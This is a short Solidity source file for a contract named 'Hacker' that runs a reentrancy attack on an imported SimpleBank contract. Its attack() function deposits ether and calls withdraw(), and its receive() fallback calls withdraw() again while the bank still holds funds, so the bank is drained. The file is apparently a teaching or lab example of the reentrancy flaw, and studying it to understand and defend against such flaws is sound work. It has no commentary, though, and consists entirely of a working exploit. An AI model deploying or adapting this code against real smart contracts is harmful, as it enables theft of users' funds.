// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SimpleBank.sol";

contract Hacker {

    SimpleBank public  simpleBank;

    constructor(address _simpleBankAddress) {
        simpleBank = SimpleBank(_simpleBankAddress);
    }

    receive() external  payable  {
        if(address(simpleBank).balance >= 1 ether){
            simpleBank.withdraw();
        }
    }
    
    function attack() public  payable  {
        require(msg.value >= 1 ether);
        simpleBank.deposit{value: msg.value}();
        simpleBank.withdraw();   
    }

}
